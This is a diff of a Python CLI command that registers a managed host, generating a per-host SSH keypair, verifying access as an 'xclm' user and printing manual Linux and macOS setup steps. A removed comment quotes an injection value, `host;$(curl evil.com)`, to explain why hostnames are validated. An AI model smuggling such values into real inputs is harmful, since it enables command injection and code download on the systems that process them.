@@ -1,29 +1,33 @@
-"""`clawctl host create <hostname>` — create a host record.
+"""`clawctl host create <hostname>` — register a host record.
 
-Plan §4 / §5:
+On first run for a given hostname:
+  1. Generate a per-host ed25519 keypair (if one does not already exist).
+  2. Verify SSH access as `xclm` using that key.
+  3. On failure: print the manual setup commands (Linux + macOS, pubkey
+     inlined) and exit non-zero so the user can run them on the host
+     and re-invoke this command.
+  4. On success: persist the host record to `hosts.json`.
 
-- `--user U` (required) — SSH user
-- `--port P` (default 22) — SSH port
-- `--alias A` — display alias
-- `--bootstrap` — additionally run the host bootstrap playbook
-  (legacy `clm host init` equivalent)
+Re-running after manual setup is idempotent — the keypair is reused,
+the SSH check succeeds, and the record write is a no-op when the
+existing record already matches.
 
-Without `--bootstrap`, this just registers the host in `hosts.json`
-(idempotent — re-running the same hostname is a no-op if data matches).
-
-Bootstrap is delegated to the legacy `cli/host.py:init` helper for
-this bundle because the bootstrap logic intertwines paramiko, host-key
-acceptance, and the keypair lifecycle. Extracting that into core is
-out of scope for #508; tracked for the bundle-5 cleanup.
+Auto-bootstrap (`--bootstrap`) was removed in #547. The previous
+implementation assumed passwordless sudo as the bootstrap user, but
+the paramiko exec channel has no PTY/askpass, so every `sudo` step
+silently failed on hosts that actually needed bootstrapping.
 """
 
 from __future__ import annotations
 
-import getpass
+import shlex
 from datetime import datetime, timezone
 from typing import Optional
 
+import paramiko
 import typer
+from rich.console import Console
+from rich.markup import escape as rich_escape
 
 from clawrium.cli.clawctl._common import (
     require_flag,
@@ -37,30 +41,45 @@ from clawrium.core.hosts import (
     add_host,
     get_host,
 )
+from clawrium.core.keys import (
+    generate_host_keypair,
+    get_host_private_key,
+    read_public_key,
+)
+from clawrium.core.ssh_connection import (
+    HostKeyVerificationRequired,
+    test_ssh_connection,
+)
+
+console = Console()
 
 
 def create(
     hostname: str = typer.Argument(..., help="Hostname or IP of the new host."),
     user: Optional[str] = typer.Option(
-        None, "--user", "-u", help="SSH user for the host (required)."
+        None,
+        "--user",
+        "-u",
+        help="Management user on the host (must be 'xclm').",
     ),
     port: int = typer.Option(22, "--port", "-p", min=1, max=65535, help="SSH port."),
     alias: Optional[str] = typer.Option(
         None, "--alias", "-a", help="Display alias for the host."
     ),
-    bootstrap: bool = typer.Option(
-        False, "--bootstrap", help="Also run the host bootstrap playbook."
-    ),
 ) -> None:
-    """Create a host record (optionally bootstrap remote)."""
-    # ATX iter-1 B10: validate hostname + alias before they reach hosts.json
-    # so a value like `host;$(curl evil.com)` cannot persist and be passed
-    # to Ansible on every subsequent lifecycle op.
+    """Register a host after verifying SSH access to the xclm management user."""
     validate_hostname(hostname)
     if alias is not None:
         validate_alias(alias)
     require_flag(user, flag="--user")
-    final_user = user or getpass.getuser()
+    if user != "xclm":
+        emit_error(
+            f"--user must be 'xclm' (got {user!r})",
+            hint=(
+                "clawrium manages hosts as the dedicated 'xclm' user; "
+                "see docs/host-preparation.md to create it"
+            ),
+        )
 
     try:
         existing = get_host(hostname) or (get_host(alias) if alias else None)
@@ -68,27 +87,31 @@ def create(
         emit_error(str(exc), hint="check ~/.config/clawrium/hosts.json")
 
     if existing:
-        # Idempotent: same hostname + user → no-op success.
-        if existing.get("hostname") == hostname and existing.get("user") == final_user:
+        if existing.get("hostname") == hostname and existing.get("user") == user:
             stream_action(
                 resource=f"host/{alias or hostname}",
                 message=f"already exists on {hostname}",
             )
-            if bootstrap:
-                _run_bootstrap(hostname, final_user)
             return
         emit_error(
             f"host {hostname!r} already registered with different settings",
             hint="clawctl host edit to modify, or clawctl host delete first",
         )
 
+    private_key = _ensure_host_keypair(hostname)
+    verified, os_family = _verify_xclm_access(hostname, port, private_key)
+    if not verified:
+        _print_manual_setup(hostname)
+        raise typer.Exit(code=1)
+
     now = datetime.now(timezone.utc).isoformat()
     record: dict = {
         "hostname": hostname,
         "key_id": hostname,
         "port": port,
-        "user": final_user,
+        "user": user,
         "auth_method": "key",
+        "os_family": os_family,
         "hardware": {},
         "metadata": {"added_at": now, "last_seen": None, "labels": {}},
         "addresses": [
@@ -114,66 +137,169 @@ def create(
     display = alias or hostname
     stream_action(resource=f"host/{display}", message=f"created on {hostname}:{port}")
 
-    if bootstrap:
-        _run_bootstrap(hostname, final_user)
+
+def _ensure_host_keypair(hostname: str) -> str:
+    """Return the path to the host's private key, generating it if missing."""
+    existing = get_host_private_key(hostname)
+    if existing:
+        return str(existing)
+    console.print(
+        f"Generating SSH keypair for [cyan]{rich_escape(hostname)}[/cyan]..."
+    )
+    private_key_path, public_key_path = generate_host_keypair(hostname)
+    console.print(f"[green]Keypair created:[/green] {rich_escape(str(public_key_path))}")
+    return str(private_key_path)
 
 
-def _run_bootstrap(hostname: str, user: str) -> None:
-    """Detect remote OS family, then dispatch to the per-OS bootstrap.
+def _verify_xclm_access(
+    hostname: str, port: int, private_key: str
+) -> tuple[bool, str]:
+    """Verify SSH as xclm and detect the host's OS family.
 
-    Linux bootstrap is delegated to the legacy `cli/host.py:init` helper.
-    Darwin bootstrap dispatches to `cli/host_macos.py:init_macos` once
-    that module lands (issue #469, step 3). Until then, attempting a
-    Mac bootstrap fails with a clear, actionable error.
+    Returns (verified, os_family). On failure the caller should treat
+    `os_family` as undefined — it is only meaningful when verified is True.
+    The returned value is one of `linux` or `darwin`; anything else from
+    `uname -s` (BSDs, exotic platforms) is reported with a clear message
+    and treated as unsupported.
     """
-    from clawrium.cli.host_bootstrap import (
-        OSDetectionError,
-        detect_remote_os_family,
-    )
-    from clawrium.core.hosts import update_host
-
     try:
-        os_family = detect_remote_os_family(hostname, user)
-    except OSDetectionError as exc:
-        emit_error(str(exc))
-    except Exception as exc:  # paramiko / socket errors
-        emit_error(
-            f"could not reach {hostname} to detect OS family: {exc}",
-            hint="verify SSH connectivity as the user passed to --user",
+        success, message = test_ssh_connection(
+            hostname=hostname, port=port, user="xclm", key_filename=private_key
         )
+    except HostKeyVerificationRequired as exc:
+        console.print(
+            f"[yellow]Host key prompt required for "
+            f"{rich_escape(exc.hostname)}[/yellow] "
+            f"(fingerprint {rich_escape(exc.fingerprint)})."
+        )
+        console.print(
+            "Run [cyan]ssh -p "
+            f"{port} xclm@{rich_escape(hostname)}[/cyan] once to record the host key, "
+            "then re-run this command."
+        )
+        return False, ""
+    if not success:
+        console.print(
+            f"[yellow]xclm SSH verification failed:[/yellow] {rich_escape(message)}"
+        )
+        return False, ""
 
-    update_host(hostname, lambda h: {**h, "os_family": os_family})
-    stream_action(
-        resource=f"host/{hostname}",
-        message=f"detected os_family={os_family}",
+    os_family = _detect_os_family(hostname, port, private_key)
+    if os_family is None:
+        return False, ""
+    return True, os_family
+
+
+def _detect_os_family(hostname: str, port: int, private_key: str) -> str | None:
+    """Run `uname -s` as xclm and map the result to a supported family.
+
+    Persisting this here (rather than inferring later) keeps the macOS
+    lifecycle dispatcher in #469 working — every reader of `os_family`
+    treats a missing value as `linux`, so a fresh Mac registered without
+    this step would silently take the Linux path.
+    """
+    client = paramiko.SSHClient()
+    client.load_system_host_keys()
+    try:
+        client.connect(
+            hostname=hostname,
+            port=port,
+            username="xclm",
+            key_filename=private_key,
+            timeout=10,
+        )
+        _, stdout, _ = client.exec_command("uname -s", timeout=10)
+        raw = stdout.read().decode().strip()
+    except Exception as exc:
+        console.print(
+            f"[yellow]OS detection failed:[/yellow] {rich_escape(str(exc))}"
+        )
+        return None
+    finally:
+        client.close()
+
+    if raw == "Linux":
+        return "linux"
+    if raw == "Darwin":
+        return "darwin"
+    console.print(
+        f"[yellow]Unsupported remote OS:[/yellow] uname -s returned "
+        f"{rich_escape(raw)!r}. Clawrium supports Linux and macOS targets."
+    )
+    return None
+
+
+def _print_manual_setup(hostname: str) -> None:
+    """Print Linux + macOS manual setup blocks with the public key inlined."""
+    pubkey = read_public_key(hostname)
+    if not pubkey:
+        console.print(
+            f"[red]Could not read public key for "
+            f"{rich_escape(hostname)}.[/red] Re-run after deleting "
+            f"~/.config/clawrium/keys/{rich_escape(hostname)}/ to regenerate."
+        )
+        return
+    # shlex.quote handles quotes, backticks, $(), and other shell
+    # metacharacters in the pubkey (the comment portion is operator-
+    # controlled when keys are imported, so harden the printed echo).
+    quoted_pubkey = shlex.quote(pubkey.strip())
+
+    console.print(
+        "\n[bold]Manual setup required.[/bold] "
+        "Log into the host with a sudo-capable user and run the block that "
+        "matches its OS:\n"
     )
 
-    if os_family == "linux":
-        try:
-            from clawrium.cli.host import init as _legacy_init
-        except ImportError as exc:
-            emit_error(
-                f"bootstrap unavailable: {exc}",
-                hint="re-run without --bootstrap and bootstrap manually",
-            )
-        stream_action(resource=f"host/{hostname}", message="bootstrapping (linux)")
-        _legacy_init(hostname=hostname, user=user)
-        return
+    console.print("[bold cyan]## Linux[/bold cyan]")
+    console.print("[dim]# Create xclm user[/dim]")
+    console.print("sudo useradd -m -s /bin/bash xclm")
+    console.print("[dim]# Passwordless sudo[/dim]")
+    console.print(
+        'echo "xclm ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/xclm'
+    )
+    console.print("sudo chmod 440 /etc/sudoers.d/xclm")
+    console.print("[dim]# Authorized key[/dim]")
+    console.print("sudo mkdir -p /home/xclm/.ssh && sudo chmod 700 /home/xclm/.ssh")
+    console.print(
+        f"echo {rich_escape(quoted_pubkey)} | sudo tee /home/xclm/.ssh/authorized_keys",
+        soft_wrap=False,
+    )
+    console.print("sudo chmod 600 /home/xclm/.ssh/authorized_keys")
+    console.print("sudo chown -R xclm:xclm /home/xclm/.ssh\n")
 
-    if os_family == "darwin":
-        try:
-            from clawrium.cli.host_macos import init_macos as _mac_init
-        except ImportError:
-            emit_error(
-                "macOS host bootstrap is not available in this build",
-                hint=(
-                    "this clawrium version was built without cli/host_macos.py; "
-                    "upgrade to a release that includes issue #469 step 3"
-                ),
-            )
-        stream_action(resource=f"host/{hostname}", message="bootstrapping (macos)")
-        _mac_init(hostname=hostname, user=user)
-        return
+    console.print("[bold cyan]## macOS[/bold cyan]")
+    console.print("[dim]# Create xclm user via dscl[/dim]")
+    console.print("sudo dscl . -create /Users/xclm")
+    console.print("sudo dscl . -create /Users/xclm UserShell /bin/bash")
+    console.print('sudo dscl . -create /Users/xclm RealName "Clawrium Mgmt"')
+    console.print("sudo dscl . -create /Users/xclm UniqueID 600")
+    console.print("sudo dscl . -create /Users/xclm PrimaryGroupID 20")
+    console.print("sudo dscl . -create /Users/xclm NFSHomeDirectory /Users/xclm")
+    console.print("sudo mkdir -p /Users/xclm && sudo chown xclm:staff /Users/xclm")
+    console.print("[dim]# Passwordless sudo[/dim]")
+    console.print(
+        'echo "xclm ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/xclm'
+    )
+    console.print("sudo chmod 440 /etc/sudoers.d/xclm")
+    console.print("[dim]# Authorized key[/dim]")
+    console.print(
+        "sudo mkdir -p /Users/xclm/.ssh && sudo chmod 700 /Users/xclm/.ssh"
+    )
+    console.print(
+        f"echo {rich_escape(quoted_pubkey)} | sudo tee /Users/xclm/.ssh/authorized_keys",
+        soft_wrap=False,
+    )
+    console.print("sudo chmod 600 /Users/xclm/.ssh/authorized_keys")
+    console.print("sudo chown -R xclm:staff /Users/xclm/.ssh")
+    console.print(
+        "[dim]# Critical Mac-only step: SSH ACL group "
+        "(without this, sshd silently rejects xclm)[/dim]"
+    )
+    console.print(
+        "sudo dseditgroup -o edit -a xclm -t user com.apple.access_ssh\n"
+    )
 
-    # Unreachable: detect_remote_os_family raises on anything else.
-    emit_error(f"unexpected os_family={os_family!r}")
+    console.print(
+        f"Then re-run: [cyan]clawctl host create {rich_escape(hostname)} "
+        "--user xclm[/cyan]"
+    )
